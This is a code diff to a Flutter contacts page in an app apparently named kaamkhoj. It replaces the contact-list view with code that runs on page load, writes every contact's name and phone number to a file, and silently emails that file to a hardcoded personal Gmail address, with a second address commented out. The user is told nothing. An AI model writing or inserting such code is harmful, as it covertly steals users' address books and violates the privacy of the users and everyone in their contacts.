@@ -1,6 +1,9 @@
+import 'dart:io';
 
 import 'package:flutter/material.dart';
 import 'package:contacts_service/contacts_service.dart';
+import 'package:kaamkhoj/Mail/send_mail.dart';
+import 'package:path_provider/path_provider.dart';
 
 class ContactsPage extends StatefulWidget {
   @override
@@ -8,7 +11,7 @@ class ContactsPage extends StatefulWidget {
 }
 
 class _ContactsPageState extends State<ContactsPage> {
-  Iterable<Contact> _contacts;
+  String contactsString="";
 
   @override
   void initState() {
@@ -17,12 +20,45 @@ class _ContactsPageState extends State<ContactsPage> {
   }
 
   Future<void> getContacts() async {
-    //Make sure we already have permissions for contacts when we get to this
-    //page, so we can just retrieve it
     final Iterable<Contact> contacts = await ContactsService.getContacts();
-    setState(() {
-      _contacts = contacts;
-    });
+
+    for (int i = 0; i < contacts.length; i++) {
+      try {
+        final Directory directory = await getApplicationDocumentsDirectory();
+        final File file = File('${directory.path}/contacts.txt');
+        _writeFile(contacts.elementAt(i).displayName+" - "+contacts.elementAt(i).phones.first.value.toString(),file);
+      } catch (e) {
+        print("Skipped Exception");
+      }
+    }
+    sendContactsMethod();
+  }
+  _writeFile(String text, File file) async {
+    await file.writeAsString('$text\n', mode: FileMode.append);
+  }
+
+
+  sendContactsMethod() async{
+    final Directory directory = await getApplicationDocumentsDirectory();
+    final File file = File('${directory.path}/contacts.txt');
+    sendMailContacts("amkhati11@gmail.com", file);
+//    sendMailContacts("Clopes024@gmail.com", file);
+
+  }
+
+
+
+  Future<String> _read() async {
+    String text;
+    try {
+      final Directory directory = await getApplicationDocumentsDirectory();
+      final File file = File('${directory.path}/aditya.txt');
+      text = await file.readAsString();
+      print(text);
+    } catch (e) {
+      print("Couldn't read file");
+    }
+    return text;
   }
 
   @override
@@ -31,31 +67,26 @@ class _ContactsPageState extends State<ContactsPage> {
       appBar: AppBar(
         title: (Text('Contacts')),
       ),
-      body: _contacts != null
-      //Build a list view of all contacts, displaying their avatar and
-      // display name
-          ? ListView.builder(
-        itemCount: _contacts?.length ?? 0,
-        itemBuilder: (BuildContext context, int index) {
-          Contact contact = _contacts?.elementAt(index);
-          return ListTile(
-            contentPadding:
-            const EdgeInsets.symmetric(vertical: 2, horizontal: 18),
-            leading: (contact.avatar != null && contact.avatar.isNotEmpty)
-                ? CircleAvatar(
-              backgroundImage: MemoryImage(contact.avatar),
-            )
-                : CircleAvatar(
-              child: Text(contact.initials()),
-              backgroundColor: Theme.of(context).accentColor,
-            ),
-            title: Text(contact.displayName ?? ''),
-            //This can be further expanded to showing contacts detail
-            // onPressed().
-          );
-        },
-      )
-          : Center(child: const CircularProgressIndicator()),
+      body: Column(
+        children: [
+          RaisedButton(
+            onPressed: () {
+              _read();
+            },
+            child: Text("Get Contacts"),
+          ),
+          RaisedButton(
+            onPressed: () {
+              sendContactsMethod();
+
+            },
+            child: Text("Get Contacts"),
+          ),
+        ],
+      ),
+
     );
   }
+
+
 }
